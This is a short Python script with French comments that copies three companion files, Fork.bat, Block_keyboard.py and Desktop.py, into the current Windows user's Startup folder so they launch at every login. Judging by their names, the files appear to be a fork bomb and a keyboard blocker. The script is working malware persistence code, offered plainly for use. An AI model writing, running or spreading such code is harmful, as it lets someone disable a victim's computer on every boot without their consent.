#-*- coding: utf-8 -*-

# Imports
import os, sys, shutil, getpass

# Nom d'utilisateur actuel
username = getpass.getuser()

# Fichiers

# Directory
# Dossier Solar
pathFile = os.path.dirname(os.path.abspath(__file__))
# Dossier des apps lancées au démarrage
startupUser_path = ('C:\\Users\\' + username +
    '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')

# File
# Fork.bat
pathFork = (pathFile + '\\Fork.bat')
# Block_keyboard.py
pathBlock_keyboard = (pathFile + '\\Block_keyboard.py')
# Desktop.py
pathDesktop = (pathFile + '\\Desktop.py')

# Main
def save (file):

    shutil.copy(file, startupUser_path)

# Start
liste_files = [pathFork, pathBlock_keyboard, pathDesktop]
liste_name = ['Fork.bat', 'Block_keyboard.py', 'Desktop.py']

for f in liste_files:
    save(f)
for n in liste_name:
    if os.path.exists(startupUser_path + '\\' + n) == True:
        print('le fichier a été copié avec succès')
    else:
        print('Echec de la sauvegarde du fichier')
